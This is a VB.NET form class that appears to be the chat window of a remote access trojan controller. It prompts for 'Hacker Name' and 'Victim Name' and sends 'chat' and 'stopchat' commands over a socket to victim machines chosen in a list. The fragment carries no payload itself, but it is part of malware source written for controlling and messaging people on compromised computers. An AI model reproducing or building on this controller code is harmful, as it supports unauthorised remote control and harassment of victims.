Public Class chat
    Public sock As Integer
    Public Hackername As String
    Public Victimename As String


    Private Sub chat_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Hackername = InputBox("Enter Your Nickname", "Hacker Name")
        Victimename = InputBox("Enter The Victim's Nickname", "Victim Name")
    End Sub
    Private Sub TextBox2_TextChanged(sender As System.Object, e As System.EventArgs)
        If TextBox2.Text.Contains("Typehere") Then
            TextBox2.Clear()
        End If
    End Sub

    Private Sub chat_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "stopchat")
        Next
    End Sub

    Private Sub TextBox2_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles TextBox2.KeyDown
        If e.KeyCode = Keys.Enter Then
            If TextBox2.Text.Length > 0 Then
                For Each x As ListViewItem In Main.L1.SelectedItems
                    Main.S.Send(sock, "chat" & Main.Yy & Hackername & Main.Yy & Victimename & Main.Yy & TextBox2.Text)
                Next
                TextBox1.Text = TextBox1.Text & Environment.NewLine & Hackername & " said : " & TextBox2.Text & vbNewLine
                TextBox2.Text = ""
            Else
            End If
        End If
    End Sub
End Class